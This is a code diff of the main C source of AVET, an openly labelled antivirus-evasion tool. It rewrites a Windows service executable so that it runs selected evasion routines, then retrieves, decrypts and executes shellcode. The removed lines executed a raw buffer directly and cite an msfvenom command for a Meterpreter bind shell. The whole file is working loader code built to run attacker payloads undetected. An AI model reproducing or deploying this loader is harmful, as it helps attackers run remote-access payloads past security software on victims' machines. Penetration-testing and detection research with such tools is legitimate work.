@@ -1,155 +1,240 @@
-// compile:
-// wine gcc -m32 psexecservice.c
+/*
+Author: Daniel Sauder
+License: https://www.gnu.org/licenses/gpl.txt or LICENSE file
+Web: https://github.com/govolution/avet
+*/
+
+//     "         .==,_                                          \n"
+//     "        .===,_`\\                                        \n"
+//     "      .====,_ ` \\      .====,__                         \n"
+//     "---     .==-,`~. \\           `:`.__,                    \n"
+//     " ---      `~~=-.  \\           /^^^     MEEP MEEP        \n"
+//     "   ---       `~~=. \\         /                          \n"
+//     "                `~. \\       /                           \n"
+//     "                  ~. \\____./                            \n"
+//     "                    `.=====)                            \n"
+//     "                 ___.--~~~--.__                         \n"
+//     "       ___\\.--~~~              ~~~---.._|/              \n"
+//     "       ~~~\\\"                             /              \n"
+
+//     " ________  ___      ___ _______  _________  \n" 
+//     "|\\   __  \\|\\  \\    /  /|\\  ___ \\|\\___   ___\\ \n"
+//     "\\ \\  \\|\\  \\ \\  \\  /  / | \\   __/\\|___ \\  \\_| \n"
+//     " \\ \\   __  \\ \\  \\/  / / \\ \\  \\_|/__  \\ \\  \\  \n"
+//     "  \\ \\  \\ \\  \\ \\    / /   \\ \\  \\_|\\ \\  \\ \\  \\ \n"
+//     "   \\ \\__\\ \\__\\ \\__/ /     \\ \\_______\\  \\ \\__\\\n"
+//     "    \\|__|\\|__|\\|__|/       \\|_______|   \\|__|\n"
+//         "\n\nAnti Virus Evasion Tool by Daniel Sauder\n"
+
+
+// +++ +++ +++
+// This is the main source to generate a windows service executable with AVET.
+// If you prefer to generate a "normal" windows executable, refer to avet.c instead.
+// +++ +++ +++
+
 
 #include <windows.h>
 #include <stdio.h>
-#include "defs.h"
+#include <stdlib.h>
+
+
+// Include static data (imported C arrays)
+// Defines for static retrieval are set in this file
+#include "static_data/static_data.include"
+
+// Include debug_print macro, if set.
+#include "debug_print/debug_print.include"
+#include "implementations/debug_print/debug_print.h"
+
+// Include implementation files needed for the selected functions.
+// The included files are assembled by the build script, in which functions are selected.
+#include "evasion/evasion.include"
+#include "get_shellcode/get_shellcode.include"
+#include "get_key/get_key.include"
+#include "decode_shellcode/decode_shellcode.include"
+#include "shellcode_binder/shellcode_binder.include"
+
+
+// Set how many evasion functions can be used at maximum
+#define EVASION_ARRAY_SIZE 10
+
+
+// Service declarations
+void ServiceMain(int argc, char **argv);
+void ControlHandler(DWORD request);
+int InitService();
+
+SERVICE_STATUS ServiceStatus;
+SERVICE_STATUS_HANDLE hStatus;
 
 #define SLEEP_TIME 5000
-#ifdef PRINT_DEBUG
-	#define LOGFILE "C:\\avetdbg.txt"
-#endif
-
-SERVICE_STATUS ServiceStatus; 
-SERVICE_STATUS_HANDLE hStatus; 
- 
-void  ServiceMain(int argc, char** argv); 
-void  ControlHandler(DWORD request); 
-int InitService();
-#ifdef PRINT_DEBUG
-int WriteToLog(char*);
-#endif
-
-// some shellcode
-//# msfvenom -p windows/meterpreter/bind_tcp lport=8443 -f c -a x86 --platform Windows
-//unsigned char buf[] = 
-//unsigned char *shellcode = buf;
-
-void exec_shellcode(unsigned char *shellcode)
-{
-#ifdef PRINT_DEBUG
-	int d=sizeof(shellcode);
-	char s[200];
-	sprintf(s,"shellcode size: %d\n",d);
-	WriteToLog(s);
-#endif
-	int (*funct)();
-	funct = (int (*)()) shellcode;
-	(int)(*funct)();
-}
-
-#ifdef PRINT_DEBUG
-int WriteToLog(char* str)
-{
-	FILE* log;
-	log = fopen(LOGFILE, "a+");
-	if (log == NULL)
-		return -1;
-	fprintf(log, "%s\n", str);
-	fclose(log);
-	return 0;
-}
-#endif
-
-int main() 
-{ 
-    SERVICE_TABLE_ENTRY ServiceTable[2];
-    ServiceTable[0].lpServiceName = "MemoryStatus";
-    ServiceTable[0].lpServiceProc = (LPSERVICE_MAIN_FUNCTION)ServiceMain;
-
-    ServiceTable[1].lpServiceName = NULL;
-    ServiceTable[1].lpServiceProc = NULL;
-    // Start the control dispatcher thread for our service
-    StartServiceCtrlDispatcher(ServiceTable);  
-    return 0;
-}
 
 
-void ServiceMain(int argc, char** argv) 
-{ 
-    int error; 
- 
-    ServiceStatus.dwServiceType        = SERVICE_WIN32; 
-    ServiceStatus.dwCurrentState       = SERVICE_START_PENDING; 
-    ServiceStatus.dwControlsAccepted   = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
-    ServiceStatus.dwWin32ExitCode      = 0; 
-    ServiceStatus.dwServiceSpecificExitCode = 0; 
-    ServiceStatus.dwCheckPoint         = 0; 
-    ServiceStatus.dwWaitHint           = 0; 
- 
-    hStatus = RegisterServiceCtrlHandler(
-		"SomeService", 
-		(LPHANDLER_FUNCTION)ControlHandler); 
-    if (hStatus == (SERVICE_STATUS_HANDLE)0) 
-    { 
-        // Registering Control Handler failed
-        return; 
-    }  
-    // Initialize Service 
-    error = InitService(); 
-    if (error) 
-    {
-		// Initialization failed
-        ServiceStatus.dwCurrentState       = SERVICE_STOPPED; 
-        ServiceStatus.dwWin32ExitCode      = -1; 
-        SetServiceStatus(hStatus, &ServiceStatus); 
-        return; 
-    } 
-    // We report the running status to SCM. 
-    ServiceStatus.dwCurrentState = SERVICE_RUNNING; 
-    SetServiceStatus (hStatus, &ServiceStatus);
-#ifdef PRINT_DEBUG
-    WriteToLog("start shellcode\n");
-#endif    
-    exec_shellcode(buf);
-#ifdef PRINT_DEBUG
-    WriteToLog("shellcode executed\n");	
-#endif
-    // The worker loop of a service
-    while (ServiceStatus.dwCurrentState == SERVICE_RUNNING)
-	{
-		// do nothing
-		Sleep(SLEEP_TIME);
-	}
-    return; 
-}
-
- 
 // Service initialization
-int InitService() 
-{ 
-    
-    int result;
-#ifdef PRINT_DEBUG
-    result = WriteToLog("start service");
-#endif
-    return(result); 
-} 
+int InitService() {
+	int result;
+	result = DEBUG_PRINT("Starting AVET service...\n");
+	return result;
+}
+
 
 // Control handler function
-void ControlHandler(DWORD request) 
-{ 
-    switch(request) 
-    { 
-        case SERVICE_CONTROL_STOP: 
-            ServiceStatus.dwWin32ExitCode = 0; 
-            ServiceStatus.dwCurrentState  = SERVICE_STOPPED; 
-            SetServiceStatus (hStatus, &ServiceStatus);
-            return; 
- 
-        case SERVICE_CONTROL_SHUTDOWN: 
-            ServiceStatus.dwWin32ExitCode = 0; 
-            ServiceStatus.dwCurrentState  = SERVICE_STOPPED; 
-            SetServiceStatus (hStatus, &ServiceStatus);
-            return; 
-        
-        default:
-            break;
-    } 
- 
-    // Report current status
-    SetServiceStatus (hStatus,  &ServiceStatus);
- 
-    return; 
-} 
+void ControlHandler(DWORD request) {
+	switch(request) {
+		case SERVICE_CONTROL_STOP:
+			ServiceStatus.dwWin32ExitCode = 0;
+			ServiceStatus.dwCurrentState = SERVICE_STOPPED;
+			SetServiceStatus(hStatus, &ServiceStatus);
+			return;
+		case SERVICE_CONTROL_SHUTDOWN:
+			ServiceStatus.dwWin32ExitCode = 0;
+			ServiceStatus.dwCurrentState = SERVICE_STOPPED;
+			SetServiceStatus(hStatus, &ServiceStatus);
+			return;
+		default:
+			break;
+	}
+	// Report current status
+	SetServiceStatus(hStatus, &ServiceStatus);
+	return;
+}
 
+
+int main() {
+	SERVICE_TABLE_ENTRY ServiceTable[2];
+	ServiceTable[0].lpServiceName = "MemoryStatus";
+	ServiceTable[0].lpServiceProc = (LPSERVICE_MAIN_FUNCTION) ServiceMain;
+	ServiceTable[1].lpServiceName = NULL;
+	ServiceTable[1].lpServiceProc = NULL;
+	// Start the control dispatcher thread for our service
+	StartServiceCtrlDispatcher(ServiceTable);
+	return 0;
+}
+
+
+void ServiceMain(int argc, char **argv) {
+	// Just service things...
+	ServiceStatus.dwServiceType = SERVICE_WIN32;
+	ServiceStatus.dwCurrentState = SERVICE_START_PENDING;
+	ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
+	ServiceStatus.dwWin32ExitCode = 0;
+	ServiceStatus.dwServiceSpecificExitCode = 0;
+	ServiceStatus.dwCheckPoint = 0;
+	ServiceStatus.dwWaitHint = 0;
+	
+	hStatus = RegisterServiceCtrlHandler("SomeService", (LPHANDLER_FUNCTION) ControlHandler);
+	
+	if(hStatus == (SERVICE_STATUS_HANDLE) 0) {
+		// Registering control handler failed
+		return;
+	}
+	
+	// Initialize service
+	int error =  InitService();
+	
+	if(error) {
+		// Initialization failed
+		ServiceStatus.dwCurrentState = SERVICE_STOPPED;
+		ServiceStatus.dwWin32ExitCode = -1;
+		SetServiceStatus(hStatus, &ServiceStatus);
+	}
+		
+	
+	// AVET core functionality begins here ---	
+	
+	
+	// Function prototype pointers to store selected functions.	
+	unsigned char *(*get_shellcode) (char *arg1, int *shellcode_size) = NULL;
+	unsigned char *(*get_key) (char *arg1, int *key_length) = NULL;
+	void (*decode_shellcode) (const unsigned char *ciphertext, const int ciphertext_length, const unsigned char *key, const int key_length, unsigned char *plaintext) = NULL;
+	void (*shellcode_binder) (unsigned char *shellcode) = NULL;
+	
+	// Define array to store multiple evasion functions.
+	// Set static array size of 10 because dynamic size handling in cooperation with build scripts would be too messy.
+	// The included evasion.assign file will take care of populating the array.
+	typedef void (*evasion_function) (char *arg1);
+	evasion_function evasion_functions[EVASION_ARRAY_SIZE]; 
+	// NULL the array to make later checks succeed
+	for(int i = 0; i < EVASION_ARRAY_SIZE; i++) {
+		evasion_functions[i] = NULL;
+	}
+		
+	// Assign selected functions to prototypes
+	// Included assignment code is assembled by the build script
+	#include "evasion/evasion.assign"
+	#include "get_shellcode/get_shellcode.assign"
+	#include "get_key/get_key.assign"
+	#include "decode_shellcode/decode_shellcode.assign"
+	#include "shellcode_binder/shellcode_binder.assign"
+			
+	// Execute evasion functions
+	if(evasion_functions[0] == NULL) {
+		DEBUG_PRINT("No evasion techniques applied.\n");
+	}	
+	
+	for(int i = 0; i < EVASION_ARRAY_SIZE; i++) {
+		if(evasion_functions[i] != NULL) {	
+			DEBUG_PRINT("Executing evasion function %d.\n", i);
+			evasion_functions[i]("");
+		}
+	}	
+	
+	// Retrieve encoded shellcode
+	int shellcode_size = 0;
+	// If shellcode is retrieved statically, set the argument acoordingly to ensure that the correct data is delivered
+	#ifdef STATIC_SHELLCODE	
+	unsigned char *encoded_shellcode = get_shellcode("static_shellcode", &shellcode_size);
+	#else
+	unsigned char *encoded_shellcode = get_shellcode(argv[1], &shellcode_size);
+	#endif
+	if(encoded_shellcode != NULL) {
+		DEBUG_PRINT("Retrieved shellcode data, size is %d bytes.\n", shellcode_size);
+		for(int i = 0; i < shellcode_size; i++) {
+			DEBUG_PRINT("%02x ", encoded_shellcode[i]);
+		}
+		DEBUG_PRINT("\n\n");
+	} else {
+		DEBUG_PRINT("No shellcode retrieved.\n");
+	}
+	
+	// Retrieve crypto key
+	int key_length = 0;
+	// If key is retrieved statically, set the argument accordingly to ensure that the correct data is delivered
+	#ifdef STATIC_KEY
+	unsigned char *key = get_key("static_key", &key_length);
+	#else
+	unsigned char *key = get_key(argv[2], &key_length);
+	#endif
+	if(key != NULL) {
+		DEBUG_PRINT("Retrieved key data, key length is %d bytes.\n", key_length);
+		for(int i = 0; i < key_length; i++) {
+			DEBUG_PRINT("%02x ", key[i]);
+		}
+		DEBUG_PRINT("\n\n");
+	} else {
+		DEBUG_PRINT("No key retrieved.\n");
+	}
+		
+	// Decode shellcode
+	unsigned char* shellcode = (unsigned char *) malloc(shellcode_size);
+	DEBUG_PRINT("Calling decode_shellcode...\n");
+	decode_shellcode(encoded_shellcode, shellcode_size, key, key_length, shellcode);
+	DEBUG_PRINT("Decoded shellcode: \n");	
+	for(int i = 0; i < shellcode_size; i++) {
+		DEBUG_PRINT("%02x ", shellcode[i]);
+	}
+	DEBUG_PRINT("\n\n");
+	
+	// Bind and execute shellcode
+	DEBUG_PRINT("Calling shellcode_binder...\n");
+	shellcode_binder(shellcode);
+	
+	DEBUG_PRINT("Execution finished.\n");	
+		
+	
+	// Service worker loop
+	while(ServiceStatus.dwCurrentState == SERVICE_RUNNING) {
+		// Stay idle after invoking shellcode
+		Sleep(SLEEP_TIME);
+	}		
+}
